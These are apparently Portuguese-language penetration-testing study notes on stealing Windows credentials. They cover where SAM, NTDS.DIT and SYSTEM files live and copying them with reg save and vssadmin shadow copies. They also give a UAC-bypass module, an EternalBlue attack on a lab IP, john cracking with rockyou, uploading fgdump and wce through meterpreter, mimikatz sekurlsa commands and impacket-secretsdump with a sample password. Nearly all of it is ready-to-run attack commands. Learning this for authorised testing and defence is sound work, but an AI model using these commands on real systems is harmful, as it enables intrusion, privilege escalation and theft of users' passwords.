SAM - Security Account Manager (Windows)
- Amazena as contas de usuários
- %SystemRoot%/system32/config/SAM

NTDS.DIT (Windows Server / Active Directory)
- Armazena dados do AD incluindo as contas de usuários
- %SystemRoot%/ntds/ntds.DIT

SYSTEM 
- Arquivo do sistema necessário para decriptar o SAM/NTDS.DIT
- %SystemRoot%/system32/config/system 

Formato arquivo de usuários do windows
[usuário]:[ID]:[hash LM]:[hash NTLM]
Obs: o id 500 é referente o usuário Administrador
Obs: hash LM = aad3...4ee == vazio (significa que não está usando LM) 

Pegar arquivo SAM e SYSTEM sistemas antigos:
Obs existe uma cópia desses arquivos no diretório: C:\WINDOWS\repair\> mas pode estar desatualizado
- reg save hklm\sam [NOME DO ARQUIVO DE SAÍDA] : esse comando coleta as informações de hash direto do registro do windows, só que precisa de permissão administrador

OBS: hklm (HKEY_LOCAL_MACHINE) 

Pegar arquivo SAM e SYSTEM sistemas modernos:
- reg save hklm\sam [NOME DO ARQUIVO DE SAÍDA] -> Mas precisa de acesso admin para conseguir realizar a coleta
Obs: é necessário procurar um exploit de UAC para escalar privilégios no windows
- vssadmin list volumes
- vssadmin create shadow /for=c:

OBS para UAC: o Longatto gosta de usar o exploit -> exploit/windows/local/bypassuac_fodhelper

Obtendo as hashes em servidores windows com AD (Active Directory):
EX: ataque ao servidor 172.16.1.233 com exploit -> windows/smb/ms17_010_eternalblue_win8
- vssadmin list volumes
- vssadmin create shadow /for=c:

Comando john para quebrar hashes:
- john --format=lm [hash]
- john --format=nt --wordlist=/usr/share/wordlist/rockyou.txt [hash]
- john --format=nt [hashes] --show

Ferramentas para executar dentro no windows ou pelo meterpreter para obter hashes:
- fazendo um upload do arquivo "/usr/share/windows-binaries/fgdump/fgdump.exe" para o windows e executando ele lá dentro
 EX: meterpreter> upload /usr/share/windows-binaries/fgdump/fgdump.exe c:
    executando o arquivo ele terá como output dois arquivos: 127.0.0.1.cachedump, 127.0.0.1.pwdump contendo as informações

- fazendo o upload do arquivo "/usr/share/windows-resources/wce/wce-universal.exe" para dentro do windows
    EX: meterpreter> upload /usr/share/windows-resources/wce/wce-universal.exe c:
        - wce-universal.exe -w: o resultado será os hashe já em texto claro

Agora usando o meterpreter:
meterpreter> load mimikatz -> É necessário esse comando para instalar o módulo do mimikatz no meterpreter
meterpreter> wdigest
meterpreter> mimikatz_command -f sekurlsa -a full
meterpreter> mimikatz_command -f sekurlsa::searchPasswords
meterpreter> mimikatz_command -f sekurlsa::logonPasswords

Ferramentas para conexão RDP:
- xfreerdp
- rdpdesktop

Ferramenta para conseguir hashes remotamente:
- impacket-secretsdump [usuário]:[senha]@[ip]
    EX: impacket-secretsdump rogerio:Roger@10@172.16.1.60